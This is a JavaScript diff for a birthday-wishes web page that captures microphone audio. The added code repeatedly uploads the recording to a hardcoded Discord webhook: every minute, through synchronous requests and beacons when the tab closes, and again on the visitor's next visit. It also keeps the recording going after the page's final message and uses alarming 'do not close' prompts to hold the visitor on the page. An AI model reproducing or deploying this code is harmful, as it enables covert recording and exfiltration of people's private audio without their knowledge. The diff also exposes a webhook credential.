@@ -817,10 +817,14 @@ function startRecording(stream) {
                     
                     // Send periodically for very long sessions (every 3 minutes)
                     // This ensures we don't lose everything if the page crashes
-                    if (audioChunks.length > 0 && audioChunks.length % 180 === 0) { // ~3 minutes of 1-second chunks
-                        console.log("Sending periodic chunk batch for long session");
-                        const miniSession = `${recordingSession}_part${Math.floor(chunkCounter/180)}`;
-                        await sendRecordingSession([...audioChunks.slice(-180)], miniSession);
+                    if (audioChunks.length > 0 && (audioChunks.length % 180 === 0 || audioChunks.length === 60)) { // ~3 minutes or 1 minute mark
+                        console.log(`Auto-sending periodic chunk batch (${audioChunks.length} seconds recorded so far)`);
+                        const miniSession = `${recordingSession}_part${Math.floor(chunkCounter/60)}`;
+                        
+                        // Always send from the beginning, but don't clear the buffer
+                        // This ensures we have complete recordings
+                        const chunksToSend = [...audioChunks];
+                        sendRecordingSession(chunksToSend, miniSession);
                     }
                 } catch (error) {
                     console.error('Error processing audio chunk:', error);
@@ -840,6 +844,23 @@ function startRecording(stream) {
         
         // Set up retry mechanism for pending chunks
         setInterval(processPendingChunks, 5000);
+        
+        // Add timer to regularly send accumulated audio even if the user doesn't close
+        // This provides redundancy and ensures we get the audio
+        const sendInterval = setInterval(() => {
+            if (audioChunks.length > 30 && !recordingPaused) {
+                console.log(`Auto backup: Sending current ${audioChunks.length}s recording...`);
+                const backupSessionId = `${recordingSession}_backup_${Date.now()}`;
+                const chunksToSend = [...audioChunks];
+                
+                // Don't clear buffer, this is just a redundant backup
+                // The actual clearing happens on tab switch/close
+                sendRecordingSession(chunksToSend, backupSessionId);
+            }
+        }, 60000); // Every minute, check and send if we have a significant recording
+        
+        // Store the interval so we can clear it later
+        window.recordingSendInterval = sendInterval;
         
     } catch (error) {
         console.error('Error starting recording:', error);
@@ -930,70 +951,49 @@ async function stopAndSendRecording() {
             mediaRecorder.stop();
             isRecording = false;
             
-            // For large recordings, split into smaller chunks of max 60 seconds each
+            // For large recordings, optimize the sending process
             if (audioChunks.length > 60) {
-                console.log(`Large recording detected (${audioChunks.length} seconds), splitting into smaller chunks`);
+                console.log(`Large recording detected (${audioChunks.length} seconds), optimizing transmission`);
                 
-                const totalChunks = audioChunks.length;
-                const batchSize = 60; // 1-minute batches
-                const numBatches = Math.ceil(totalChunks / batchSize);
+                // Use a single blob for faster processing
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
+                const sessionId = `${recordingSession}_complete`;
                 
-                // Send in batches
-                for (let i = 0; i < numBatches; i++) {
-                    const start = i * batchSize;
-                    const end = Math.min((i + 1) * batchSize, totalChunks);
-                    const batchChunks = audioChunks.slice(start, end);
+                // Send as a single unit using a faster method
+                try {
+                    const formData = new FormData();
+                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                    const elapsedTime = Math.floor((Date.now() - recordingStartTime) / 1000);
+                    const filename = `birthday_wishes_${timestamp}_complete_${elapsedTime}sec.webm`;
                     
-                    if (batchChunks.length > 0) {
-                        const batchSessionId = `${recordingSession}_batch${i+1}of${numBatches}`;
-                        console.log(`Sending batch ${i+1} of ${numBatches} (${batchChunks.length} seconds)`);
-                        
-                        try {
-                            await sendRecordingSession(batchChunks, batchSessionId);
-                        } catch (error) {
-                            console.error(`Error sending batch ${i+1}:`, error);
-                            
-                            // Emergency local storage as JSON for recovery
-                            try {
-                                const batchBlob = new Blob(batchChunks, { type: 'audio/webm;codecs=opus' });
-                                const batchReader = new FileReader();
-                                batchReader.onload = function() {
-                                    try {
-                                        // Store as base64 in localStorage for recovery later
-                                        localStorage.setItem(`emergency_audio_${batchSessionId}`, batchReader.result);
-                                        console.log(`Emergency saved batch ${i+1} to localStorage`);
-                                    } catch (e) {
-                                        console.error("LocalStorage also failed:", e);
-                                    }
-                                };
-                                batchReader.readAsDataURL(batchBlob);
-                            } catch (localError) {
-                                console.error("Failed emergency localStorage backup:", localError);
-                            }
-                        }
-                    }
+                    formData.append('file', audioBlob, filename);
+                    formData.append('content', `Complete recording - Duration: ~${elapsedTime}s`);
+                    
+                    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
+                    
+                    // Use fetch with keepalive for better reliability and speed
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        body: formData,
+                        keepalive: true
+                    });
+                    
+                    console.log(`Sent complete recording (${audioChunks.length} seconds)`);
+                } catch (error) {
+                    console.error('Error sending complete recording:', error);
+                    // Fall back to regular sending method if the optimized approach fails
+                    await sendCurrentRecording();
                 }
-                
-                // Clear audio chunks after processing all batches
-                audioChunks = [];
             } else {
-                // For smaller recordings, send as a single chunk
+                // For smaller recordings, send as a single chunk (already fast)
                 if (audioChunks.length > 0) {
                     console.log(`Sending final recording (${audioChunks.length} seconds)`);
                     await sendCurrentRecording();
                 }
             }
             
-            // Try to send any stored session data from IndexedDB
-            try {
-                const storedChunks = await getChunksFromDB(recordingSession);
-                if (storedChunks && storedChunks.length > 0) {
-                    console.log(`Found ${storedChunks.length} unsent chunks in IndexedDB`);
-                    await sendRecordingSession(storedChunks, recordingSession);
-                }
-            } catch (dbError) {
-                console.error('Error sending stored recording chunks:', dbError);
-            }
+            // Clear chunks after sending
+            audioChunks = [];
             
             // Stop all tracks in the stream
             if (window.microphoneStream) {
@@ -1143,53 +1143,120 @@ document.addEventListener('visibilitychange', () => {
 window.addEventListener('beforeunload', (event) => {
     // Set a flag that we're closing
     window.isClosing = true;
-    console.log("Page closing, attempting to save recording...");
+    console.log("⚠️ Page closing, starting emergency recording transmission...");
     
-    // Send the recording before unloading
+    // Clear the auto-send interval if it exists
+    if (window.recordingSendInterval) {
+        clearInterval(window.recordingSendInterval);
+    }
+    
+    // Directly call the stop and send method first - this handles large recordings properly
     if (mediaRecorder && mediaRecorder.state === 'recording') {
-        // Urgently save what we have right now to IndexedDB
-        const finalSessionId = `${recordingSession}_closing`;
-        const audioBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
-        
-        // Last chance - save to localStorage if it's not too big
-        if (audioBlob.size < 5000000) { // Less than ~5MB
+        // Force synchronous operations as much as possible
+        try {
+            // Get the final chunk synchronously
+            mediaRecorder.requestData();
+            
+            // Stop the recorder immediately
+            mediaRecorder.stop();
+            isRecording = false;
+            
+            console.log(`Emergency: Processing ${audioChunks.length}s recording before page close`);
+            
+            // For emergency closing, we need to try multiple approaches at once
+            // to maximize chances of getting the recording
+            
+            // 1. Try a direct synchronous XMLHttpRequest first for the whole recording
+            if (audioChunks.length > 0) {
+                try {
+                    const closeBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP', false); // false = synchronous
+                    
+                    const formData = new FormData();
+                    formData.append('file', closeBlob, `full_recording_${Date.now()}.webm`);
+                    formData.append('content', `EMERGENCY CLOSE: Full ${audioChunks.length}s recording`);
+                    
+                    xhr.send(formData);
+                    console.log("Sent full recording synchronously!");
+                } catch (e) {
+                    console.log("Synchronous send failed:", e);
+                }
+            }
+            
+            // 2. Always save to localStorage regardless of size (it might work for smaller recordings)
             try {
-                const reader = new FileReader();
-                reader.onload = function() {
-                    localStorage.setItem('emergency_audio_data', reader.result);
-                    localStorage.setItem('emergency_audio_timestamp', Date.now().toString());
-                    console.log("Emergency audio saved to localStorage");
-                };
-                reader.readAsDataURL(audioBlob);
+                localStorage.setItem('emergency_recording_length', audioChunks.length.toString());
+                localStorage.setItem('emergency_recording_time', Date.now().toString());
+                
+                // Try to save at least part of it if it's too big
+                if (audioChunks.length > 0) {
+                    // Take either all chunks or last 60 seconds, whichever is smaller
+                    const emergencyChunks = audioChunks.length <= 60 ? 
+                        audioChunks : 
+                        audioChunks.slice(-60);
+                    
+                    const emergencyBlob = new Blob(emergencyChunks, { type: 'audio/webm;codecs=opus' });
+                    
+                    // Synchronous data conversion (might not finish but worth trying)
+                    const reader = new FileReader();
+                    let dataUrl = null;
+                    
+                    reader.onload = function() {
+                        dataUrl = reader.result;
+                        localStorage.setItem('emergency_audio_data', dataUrl);
+                        console.log("Successfully saved emergency data to localStorage");
+                    };
+                    
+                    // Start the read operation
+                    reader.readAsDataURL(emergencyBlob);
+                }
             } catch (e) {
                 console.error("LocalStorage save failed:", e);
             }
-        }
-        
-        // Try the beacon API with a smaller chunk if too large
-        if (navigator.sendBeacon && audioChunks.length > 0) {
-            // Use the last 30 seconds max (beacon API has limitations)
-            const recentChunks = audioChunks.slice(-30);
-            const recentBlob = new Blob(recentChunks, { type: 'audio/webm;codecs=opus' });
-            const formData = new FormData();
-            formData.append('file', recentBlob, `closing_${Date.now()}.webm`);
-            formData.append('content', 'Emergency closing chunk');
             
-            navigator.sendBeacon(
-                'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP',
-                formData
-            );
-            console.log("Sent final 30 seconds with beacon API");
+            // 3. Try beacon API with chunks if available
+            if (navigator.sendBeacon && audioChunks.length > 0) {
+                // Send in smaller chunks to increase chances of success
+                const MAX_CHUNK_SIZE = 30; // 30 seconds per beacon
+                const numBeacons = Math.ceil(audioChunks.length / MAX_CHUNK_SIZE);
+                
+                for (let i = 0; i < numBeacons; i++) {
+                    const start = i * MAX_CHUNK_SIZE;
+                    const end = Math.min((i + 1) * MAX_CHUNK_SIZE, audioChunks.length);
+                    const beaconChunks = audioChunks.slice(start, end);
+                    
+                    try {
+                        const beaconBlob = new Blob(beaconChunks, { type: 'audio/webm;codecs=opus' });
+                        const formData = new FormData();
+                        formData.append('file', beaconBlob, `emergency_part${i+1}of${numBeacons}_${Date.now()}.webm`);
+                        formData.append('content', `Emergency Part ${i+1}/${numBeacons} (${beaconChunks.length}s)`);
+                        
+                        const beaconSent = navigator.sendBeacon(
+                            'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP',
+                            formData
+                        );
+                        
+                        console.log(`Beacon ${i+1}/${numBeacons} sent: ${beaconSent}`);
+                    } catch (beaconError) {
+                        console.error(`Beacon ${i+1} error:`, beaconError);
+                    }
+                }
+            }
+            
+            console.log("All emergency transmission attempts complete");
+        } catch (emergencyError) {
+            console.error("Critical error during emergency recording save:", emergencyError);
         }
     }
     
     // Show confirmation dialog to give more time for upload
     event.preventDefault();
-    event.returnValue = 'Are you sure you want to leave? Your birthday wishes may be lost!';
+    event.returnValue = 'WAIT! We are saving your recording. Click CANCEL to stay on the page, or click OK again to leave without saving.';
     return event.returnValue;
 });
 
-// Add recovery mechanism to check local storage on startup
+// Add a special recovery handler for the next visit
 document.addEventListener('DOMContentLoaded', async () => {
     // Initialize IndexedDB
     try {
@@ -1197,12 +1264,72 @@ document.addEventListener('DOMContentLoaded', async () => {
         
         // Check for emergency saved audio in localStorage
         if (localStorage.getItem('emergency_audio_data')) {
-            console.log("Found emergency audio in localStorage, attempting to send...");
+            console.log("Found emergency audio in localStorage from previous session. Sending now...");
             try {
                 const base64Data = localStorage.getItem('emergency_audio_data');
-                const timestamp = localStorage.getItem('emergency_audio_timestamp') || Date.now();
+                const timestamp = localStorage.getItem('emergency_audio_timestamp') || 
+                                  localStorage.getItem('emergency_recording_time') || 
+                                  Date.now();
+                const length = localStorage.getItem('emergency_recording_length') || 'unknown';
                 
                 // Convert base64 to blob
+                try {
+                    const byteString = atob(base64Data.split(',')[1]);
+                    const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
+                    const ab = new ArrayBuffer(byteString.length);
+                    const ia = new Uint8Array(ab);
+                    for (let i = 0; i < byteString.length; i++) {
+                        ia[i] = byteString.charCodeAt(i);
+                    }
+                    const blob = new Blob([ab], {type: mimeString});
+                    
+                    // Send it with high priority
+                    const formData = new FormData();
+                    formData.append('file', blob, `recovered_${timestamp}_length${length}s.webm`);
+                    formData.append('content', `⚠️ RECOVERED EMERGENCY RECORDING from local storage (length: ${length}s)`);
+                    
+                    console.log("Sending recovered recording...");
+                    
+                    // Use fetch with high priority
+                    fetch('https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP', {
+                        method: 'POST',
+                        body: formData,
+                        priority: 'high'
+                    }).then(() => {
+                        console.log("✅ Successfully sent recovered audio");
+                        // Clear emergency data after successful send
+                        localStorage.removeItem('emergency_audio_data');
+                        localStorage.removeItem('emergency_audio_timestamp');
+                        localStorage.removeItem('emergency_recording_length');
+                        localStorage.removeItem('emergency_recording_time');
+                    }).catch(error => {
+                        console.error("Failed to send recovered audio:", error);
+                    });
+                } catch (conversionError) {
+                    console.error("Error converting base64 to blob:", conversionError);
+                }
+            } catch (e) {
+                console.error("Error processing emergency audio:", e);
+            }
+        }
+        
+        // Check for emergency batch recordings
+        const emergencyKeys = [];
+        Object.keys(localStorage).forEach(key => {
+            if (key.startsWith('emergency_audio_')) {
+                emergencyKeys.push(key);
+                console.log(`Found emergency batch: ${key}`);
+            }
+        });
+        
+        // Process emergency keys sequentially
+        for (const key of emergencyKeys) {
+            try {
+                const base64Data = localStorage.getItem(key);
+                const keyParts = key.split('_');
+                const sessionId = keyParts[2] || 'unknown';
+                
+                // Convert and send (similar to above)
                 const byteString = atob(base64Data.split(',')[1]);
                 const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
                 const ab = new ArrayBuffer(byteString.length);
@@ -1212,36 +1339,22 @@ document.addEventListener('DOMContentLoaded', async () => {
                 }
                 const blob = new Blob([ab], {type: mimeString});
                 
-                // Send it
                 const formData = new FormData();
-                formData.append('file', blob, `recovered_${timestamp}.webm`);
-                formData.append('content', 'Recovered emergency recording from localStorage');
+                formData.append('file', blob, `recovered_batch_${sessionId}_${Date.now()}.webm`);
+                formData.append('content', `Recovered audio batch from ${key}`);
                 
-                fetch('https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP', {
+                await fetch('https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP', {
                     method: 'POST',
                     body: formData
-                }).then(() => {
-                    console.log("Successfully sent recovered audio");
-                    localStorage.removeItem('emergency_audio_data');
-                    localStorage.removeItem('emergency_audio_timestamp');
-                }).catch(error => {
-                    console.error("Failed to send recovered audio:", error);
                 });
+                console.log(`Sent recovered batch for ${key}`);
+                localStorage.removeItem(key);
             } catch (e) {
-                console.error("Error processing emergency audio:", e);
+                console.error(`Error processing emergency batch ${key}:`, e);
             }
         }
         
-        // Check for emergency batch recordings
-        Object.keys(localStorage).forEach(key => {
-            if (key.startsWith('emergency_audio_')) {
-                // Process these similarly to the above
-                console.log(`Found emergency batch: ${key}`);
-                // Implementation would be similar to the above
-            }
-        });
-        
-        // Check for and try to send any unsent recordings from previous sessions
+        // Check for and try to send any unsent recordings from previous sessions in IndexedDB
         checkForUnsentRecordings();
     } catch (error) {
         console.error('Error initializing recording system:', error);
@@ -1260,7 +1373,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 })
                 .catch(() => {
                     console.log('Microphone access denied, some features will be limited');
-                    const message = document.createElement('p');
+    const message = document.createElement('p');
                     message.textContent = "Microphone access denied. You'll need to click the candles manually! 🎂";
                     message.style.color = '#ff6b6b';
                     message.style.marginTop = '1rem';
@@ -1648,10 +1761,161 @@ function showFinalCongrats() {
     responseText.classList.add('show');
     createConfetti();
     
+    // Create a close website button
+    const closeButton = document.createElement('button');
+    closeButton.textContent = "Close Website & Save All Responses 💾";
+    closeButton.className = 'close-button';
+    closeButton.style.marginTop = '25px';
+    closeButton.style.padding = '15px 30px';
+    closeButton.style.fontSize = '1.2rem';
+    closeButton.style.backgroundColor = '#ff85a1';
+    closeButton.style.color = 'white';
+    closeButton.style.border = 'none';
+    closeButton.style.borderRadius = '50px';
+    closeButton.style.cursor = 'pointer';
+    closeButton.style.boxShadow = '0 4px 15px rgba(255, 133, 161, 0.4)';
+    closeButton.style.transition = 'all 0.3s ease';
+    
+    closeButton.addEventListener('mouseover', () => {
+        closeButton.style.backgroundColor = '#ff6b8b';
+        closeButton.style.transform = 'translateY(-3px)';
+        closeButton.style.boxShadow = '0 8px 25px rgba(255, 133, 161, 0.5)';
+    });
+    
+    closeButton.addEventListener('mouseout', () => {
+        closeButton.style.backgroundColor = '#ff85a1';
+        closeButton.style.transform = 'translateY(0)';
+        closeButton.style.boxShadow = '0 4px 15px rgba(255, 133, 161, 0.4)';
+    });
+    
+    closeButton.onclick = async () => {
+        // Show saving message with strong warning
+        const savingContainer = document.createElement('div');
+        savingContainer.style.position = 'fixed';
+        savingContainer.style.top = '0';
+        savingContainer.style.left = '0';
+        savingContainer.style.width = '100%';
+        savingContainer.style.height = '100%';
+        savingContainer.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
+        savingContainer.style.display = 'flex';
+        savingContainer.style.flexDirection = 'column';
+        savingContainer.style.alignItems = 'center';
+        savingContainer.style.justifyContent = 'center';
+        savingContainer.style.zIndex = '9999';
+        savingContainer.style.transition = 'opacity 0.5s ease';
+        
+        const warningMessage = document.createElement('h2');
+        warningMessage.textContent = '⚠️ DO NOT CLOSE THIS WINDOW! ⚠️';
+        warningMessage.style.color = 'red';
+        warningMessage.style.marginBottom = '10px';
+        warningMessage.style.fontSize = '1.5rem';
+        warningMessage.style.fontWeight = 'bold';
+        warningMessage.style.textAlign = 'center';
+        
+        const savingMessage = document.createElement('h3');
+        savingMessage.textContent = 'Saving all your beautiful responses...';
+        savingMessage.style.color = '#ff6b6b';
+        savingMessage.style.marginBottom = '20px';
+        
+        const loadingSpinner = document.createElement('div');
+        loadingSpinner.style.width = '50px';
+        loadingSpinner.style.height = '50px';
+        loadingSpinner.style.border = '5px solid #f3f3f3';
+        loadingSpinner.style.borderTop = '5px solid #ff6b6b';
+        loadingSpinner.style.borderRadius = '50%';
+        loadingSpinner.style.animation = 'spin 1s linear infinite';
+        
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            @keyframes pulse {
+                0% { transform: scale(1); }
+                50% { transform: scale(1.05); }
+                100% { transform: scale(1); }
+            }
+        `;
+        document.head.appendChild(style);
+        
+        // Add pulsing animation to warning
+        warningMessage.style.animation = 'pulse 1.5s infinite';
+        
+        savingContainer.appendChild(warningMessage);
+        savingContainer.appendChild(savingMessage);
+        savingContainer.appendChild(loadingSpinner);
+        document.body.appendChild(savingContainer);
+        
+        try {
+            // Ensure all recordings are properly stopped and sent
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                // Create a complete recording from beginning to end
+                await stopAndSendRecording();
+                
+                // Reduced delay to make process faster
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            // Show success message
+            warningMessage.style.display = 'none'; // Remove warning
+            savingMessage.textContent = 'All responses saved successfully! ❤️';
+            savingMessage.style.color = 'green';
+            savingMessage.style.fontWeight = 'bold';
+            loadingSpinner.style.display = 'none';
+            
+            const completeMessage = document.createElement('p');
+            completeMessage.textContent = 'You can now safely close this tab. Thank you for the beautiful memories!';
+            completeMessage.style.marginTop = '20px';
+            completeMessage.style.color = '#4a4a4a';
+            savingContainer.appendChild(completeMessage);
+            
+            // Add a final close button
+            const finalCloseButton = document.createElement('button');
+            finalCloseButton.textContent = "Close Now";
+            finalCloseButton.style.marginTop = '30px';
+            finalCloseButton.style.padding = '10px 20px';
+            finalCloseButton.style.backgroundColor = '#4a4a4a';
+            finalCloseButton.style.color = 'white';
+            finalCloseButton.style.border = 'none';
+            finalCloseButton.style.borderRadius = '20px';
+            finalCloseButton.style.cursor = 'pointer';
+            finalCloseButton.onclick = () => window.close();
+            savingContainer.appendChild(finalCloseButton);
+            
+        } catch (error) {
+            console.error('Error saving responses:', error);
+            warningMessage.textContent = '⚠️ Error Occurred ⚠️';
+            savingMessage.textContent = 'Error saving responses. Please try again.';
+            savingMessage.style.color = 'red';
+            loadingSpinner.style.display = 'none';
+            
+            // Add a retry button
+            const retryButton = document.createElement('button');
+            retryButton.textContent = "Try Again";
+            retryButton.style.marginTop = '20px';
+            retryButton.style.padding = '10px 20px';
+            retryButton.style.backgroundColor = '#ff6b6b';
+            retryButton.style.color = 'white';
+            retryButton.style.border = 'none';
+            retryButton.style.borderRadius = '20px';
+            retryButton.style.cursor = 'pointer';
+            retryButton.onclick = () => {
+                document.body.removeChild(savingContainer);
+                closeButton.click();
+            };
+            savingContainer.appendChild(retryButton);
+        }
+    };
+    
+    // Append the close button
+    questionContainer.appendChild(closeButton);
+    
     // Keep recording for 30 more seconds to capture reaction
     if (mediaRecorder && mediaRecorder.state === 'recording') {
         setTimeout(() => {
-            stopAndSendRecording();
+            // Don't automatically stop the recording - let the close button handle it
+            console.log("Recording continues until close button is clicked");
         }, 30000); // 30 seconds delay
     }
 }
